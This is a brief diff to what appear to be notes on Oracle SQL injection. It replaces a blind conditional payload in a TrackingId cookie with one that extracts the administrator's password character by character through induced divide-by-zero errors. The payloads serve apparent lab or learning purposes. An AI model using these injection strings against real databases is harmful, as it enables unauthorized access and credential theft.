@@ -12,4 +12,4 @@ union oracle
 
 --------------------------------------------------------------------------------
 BLIND CONDITIONAL RESPONSES:
-TrackingId=bQrVSfdZXKdO5Uh8' UNION SELECT CASE WHEN (SUBSTR(username,1,1)='a') THEN TO_CHAR(1/1) ELSE TO_CHAR(1/0) END FROM users WHERE ROWNUM=1--;
+TrackingId=bpytJgBHx5bayObl' UNION SELECT CASE WHEN (SUBSTR(password,1,1)='b') THEN TO_CHAR(1/1) ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator'--;
